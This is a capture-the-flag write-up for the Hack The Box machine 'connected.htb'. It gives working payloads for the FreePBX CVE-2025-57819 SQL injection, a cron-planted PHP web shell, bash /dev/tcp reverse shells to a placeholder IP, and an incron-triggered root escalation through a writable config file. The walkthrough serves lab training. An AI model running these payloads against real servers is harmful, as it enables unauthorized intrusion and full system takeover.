#easy #htb #freepbx #cve-2025-57819 #sqli #cron #rce #writable-config #incron
# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/c/scan
❯ sudo nmap -p- --open -vvv --min-rate 5000 -n -Pn 10.129.245.100 -oG scan
Discovered open port 22/tcp on 10.129.245.100
Discovered open port 80/tcp on 10.129.245.100
Discovered open port 443/tcp on 10.129.245.100
```

Open ports: 80, 22, 443
```bash
[hvidal@fedora] ~/d/h/h/m/c/scan
❯ nmap -p 22,80,443 -sCV 10.129.245.100 -oN portscan.txt -Pn
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS)
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS)
```

Add `connected.htb` to `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts
```

## FreePBX
The application is running `FreePBX 16.0.40.7` which is vulnerable to [CVE-2025-57819](https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE)

# Exploitation
The installed version of `FreePBX` is vulnerable to an unauthenticated SQL injection through the `brand` parameter of the `admin/ajax.php` endpoint.
Due to improper input validation, an attacker can inject arbitrary SQL statements into the database, enabling modifications to internal tables such as `cron_jobs`.

## SQL injection

Insert a job that creates a malicious `php` file which allows remote code execution.

Encode the payload in `Base64`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ echo "<?php system($_GET['cmd']); ?>" | base64
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==
```

Create the malicious `cron` job.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST "http://connected.htb/admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model" \
    --data-urlencode "brand=x';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','wt-shell','echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==|base64 -d > /var/www/html/wt-shell.php',NULL,'* * * * *',30,1,1)-- "
```
The request returns an error because the injected SQL breaks the original query. However, the malicious statement is successfully executed.
## Gaining a shell

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -lnvp 4444
```

Wait for the `cron` job to create the malicious `php` file and execute a reverse shell.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -ik "https://connected.htb/wt-shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP/4444+0>%261'"
```

# Privilege escalation

## Enumeration

Find the writable configuration files.
```bash
[asterisk@connected]$ find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
/etc/dahdi/init.conf
```

Check the `incron` configuration.
```bash
[asterisk@connected]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

If we modify `/var/spool/asterisk/sysadmin/dahdi_restart`, the `dahdi` service is restarted and executes `/etc/dahdi/init.conf` which is a writable file.
## Exploitation

Overwrite `/etc/dahdi/init.conf` with a reverse shell payload.
```bash
[asterisk@connected]$ echo "bash -i >& /dev/tcp/IP/4445 0>&1" > /etc/dahdi/init.conf
```

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -nlvp 4445
```

Modify `/var/spool/asterisk/sysadmin/dahdi_restart` to restart `dahdi`.
```bash
[asterisk@connected]$ echo "something" > /var/spool/asterisk/sysadmin/dahdi_restart
```
Once the service is restarted, the payload is executed with root privileges, resulting in a root shell.

Read the root flag.
```txt
[root@connected]# cat /root/root.txt
```

